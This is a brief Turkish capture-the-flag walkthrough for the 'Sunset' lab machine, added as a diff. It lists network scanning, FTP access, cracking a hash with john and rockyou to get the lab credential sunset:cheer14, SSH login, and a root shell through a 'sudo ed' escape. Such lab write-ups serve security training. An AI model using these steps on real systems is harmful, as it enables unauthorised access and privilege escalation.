@@ -1,0 +1,9 @@
+SUNSET MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.59 bulundu.
+2 - nmap -sT -A 192.168.2.59
+3 - ftp 192.168.2.59
+4 - john hash -w=/usr/share/wordlists/rockyou.txt, sunset:cheer14
+5 - ssh sunset@192.168.2.59
+6 - sudo -l
+7 - sudo ed, !/bin/sh
+8 - whoami
